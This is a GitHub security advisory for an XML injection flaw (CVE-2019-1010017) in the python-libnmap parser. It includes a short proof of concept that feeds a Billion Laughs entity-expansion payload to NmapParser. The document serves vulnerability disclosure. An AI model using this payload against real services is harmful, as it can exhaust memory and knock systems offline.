# [H] XML Injection in python-libnmap

## Summary
Severity: High
Advisory: GHSA-9ccv-p7fg-m73x
CVE: CVE-2019-1010017
CWE: CWE-91
Ecosystem: PyPI
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2019-07-18
Source: https://github.com/advisories/GHSA-9ccv-p7fg-m73x
Type: github-advisory

## Affected
- PyPI: `python-libnmap` — affected >=0 <0.7.2

## Details
### Description

python-libnmap is affected by a Billion-Laughs -style XML injection vulnerability.

### PoC

```python
ty = NmapParser()

payload = """
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz><hello>&lol3;</hello></lolz>
"""

ty.parse(payload)
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2019-1010017
- https://github.com/savon-noir/python-libnmap/issues/87
- https://github.com/savon-noir/python-libnmap/commit/71b707758851e4b622f87d9a73266e06f60aeab4
- https://github.com/pypa/advisory-database/tree/main/vulns/python-libnmap/PYSEC-2019-218.yaml
- https://github.com/savon-noir/python-libnmap
